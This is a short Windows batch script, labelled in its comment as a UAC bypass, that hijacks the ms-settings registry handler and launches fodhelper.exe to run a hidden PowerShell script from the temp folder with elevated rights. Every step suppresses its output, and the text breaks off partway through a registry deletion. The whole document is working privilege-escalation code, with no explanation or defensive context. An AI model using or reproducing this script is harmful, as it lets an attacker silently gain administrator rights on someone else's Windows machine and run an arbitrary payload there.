@echo off
:: UAC bypass via registry + fodhelper
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd /c start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"%TEMP%\installer.ps1`"" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1
fodhelper.exe >nul 2>&1
reg delete "HKCU\Software\Classes\